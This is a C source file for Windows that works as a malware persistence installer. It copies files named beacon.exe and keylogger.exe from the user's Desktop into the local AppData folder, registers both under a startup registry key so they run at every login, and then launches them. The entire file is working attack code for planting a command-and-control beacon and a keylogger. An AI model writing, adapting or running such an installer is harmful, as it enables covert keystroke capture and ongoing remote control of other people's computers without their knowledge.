#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winbase.h>
#include "helpers.h"


int main() {
    const size_t bufferLen = 500;
    char *userProfilePath = getenv("UserProfile");
    char *localAppdataPath = getenv("LOCALAPPDATA");
    char beacon_src_path[bufferLen];
    char keylogger_src_path[bufferLen];
    char beacon_dst_path[bufferLen];
    char keylogger_dst_path[bufferLen];
    snprintf(beacon_src_path, bufferLen, "%s\\Desktop\\beacon.exe", userProfilePath);
    snprintf(keylogger_src_path, bufferLen, "%s\\Desktop\\keylogger.exe", userProfilePath);
    snprintf(beacon_dst_path, bufferLen, "%s\\beacon.exe", localAppdataPath);
    snprintf(keylogger_dst_path, bufferLen, "%s\\keylogger.exe", localAppdataPath);
    int return_val;
    
    CopyFile(beacon_src_path, beacon_dst_path, FALSE);
    CopyFile(keylogger_src_path, keylogger_dst_path, FALSE);

    write_to_startup_regkey(beacon_dst_path);
    write_to_startup_regkey(keylogger_dst_path);

    return_val = run_command(beacon_dst_path);
    if (return_val != 0) {
        return return_val;
    }
    return run_command(keylogger_dst_path);
}